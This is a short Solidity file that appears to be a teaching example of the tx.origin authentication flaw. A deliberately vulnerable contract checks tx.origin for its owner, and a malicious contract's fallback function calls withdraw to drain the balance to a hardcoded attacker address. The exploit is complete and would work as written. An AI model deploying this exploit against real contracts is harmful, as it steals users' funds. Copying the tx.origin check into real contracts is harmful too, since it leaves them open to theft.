pragma solidity >0.5.0;
// Example Tx.Origin Authentication Attack

contract VulnerableContract {
    address payable owner = msg.sender;

    function withdraw(address payable _recipient) public {
        require(tx.origin == owner);
        _recipient.transfer(address(this).balance);
    }

    function getBalance() view public returns(uint) {
        return address(this).balance;
    }

    function() external payable {}
}

contract MaliciousContract {
    VulnerableContract vulnerableContract = VulnerableContract(0x08970FEd061E7747CD9a38d680A601510CB659FB);
    address payable attackerAddress = 0xdD870fA1b7C4700F2BD7f44238821C26f7392148;

    function() external payable {
        vulnerableContract.withdraw(attackerAddress);
    }
}
